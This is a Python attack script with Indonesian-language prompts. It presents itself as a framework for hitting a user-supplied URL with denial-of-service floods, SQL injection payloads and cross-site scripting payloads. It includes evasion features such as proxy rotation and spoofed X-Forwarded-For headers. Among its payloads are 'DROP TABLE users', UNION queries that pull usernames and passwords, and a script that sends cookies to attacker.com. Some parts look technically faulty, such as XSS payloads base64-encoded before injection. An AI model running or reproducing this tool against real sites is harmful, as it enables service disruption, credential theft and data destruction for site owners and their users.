import requests
import random
import string
import logging
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import base64

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0',
    'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
]

PROXIES = [
    {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
    {"http": "http://proxy2.example.com:8080", "https": "http://proxy2.example.com:8080"},
]

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def random_delay(min_delay=1, max_delay=3):
    time.sleep(random.randint(min_delay, max_delay))

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        logging.info(f"Request berhasil dikirim ke {url} | Status: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request gagal: {e}")
        return None

def flood_target(url, session, number_of_requests):
    for _ in range(number_of_requests):
        try:
            response = send_request(url, session, proxy=get_random_proxy())
            if response and response.status_code >= 500:
                logging.info("Target mungkin mengalami kegagalan: Server error 5xx")
        except Exception as e:
            logging.error(f"Request gagal: {e}")

def slowloris_attack(url, session, timeout=100):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Connection': 'keep-alive',
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    }
    try:
        with requests.get(url, headers=headers, proxies=get_random_proxy(), stream=True, timeout=timeout) as response:
            logging.info("Slowloris Attack berjalan...")
            time.sleep(timeout)
            logging.info("Slowloris Attack selesai.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Slowloris gagal: {e}")

def sql_injection(url, session):
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "' AND SLEEP(5) --",
        "' OR 1=1 LIMIT 1 --",
        "' AND 1=1 UNION SELECT username, password FROM users --",
        "'; DROP TABLE users --"
    ]
    for payload in payloads:
        response = send_request(url + payload, session)
        if response and "error" in response.text.lower():
            logging.info(f"Potensi celah SQL Injection ditemukan dengan payload: {payload}")

def xss_attack(url, session):
    payloads = [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<div onmouseover='alert(1)'>Hover me</div>"
    ]
    for payload in payloads:
        encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        response = send_request(url + encoded_payload, session)
        if response and encoded_payload in response.text:
            logging.info(f"Payload XSS berhasil disuntikkan: {payload}")
        else:
            logging.info(f"Payload XSS gagal: {payload}")

def main():
    while True:
        print("Pilih serangan yang ingin diuji:")
        print("1. Denial of Service (DoS)")
        print("2. SQL Injection")
        print("3. Cross-Site Scripting (XSS)")
        print("4. Keluar")

        pilihan = input("Masukkan pilihan Anda (1-4): ")
        if pilihan == '1':
            url = input("Masukkan URL target: ")
            jumlah_request = int(input("Masukkan jumlah permintaan: "))
            session = create_session()
            flood_target(url, session, jumlah_request)
            slowloris_attack(url, session)
        elif pilihan == '2':
            url = input("Masukkan URL target: ")
            session = create_session()
            sql_injection(url, session)
        elif pilihan == '3':
            url = input("Masukkan URL target: ")
            session = create_session()
            xss_attack(url, session)
        elif pilihan == '4':
            print("Terima kasih telah menggunakan framework ini.")
            break
        else:
            print("Pilihan tidak valid, coba lagi.")

if __name__ == "__main__":
    main()
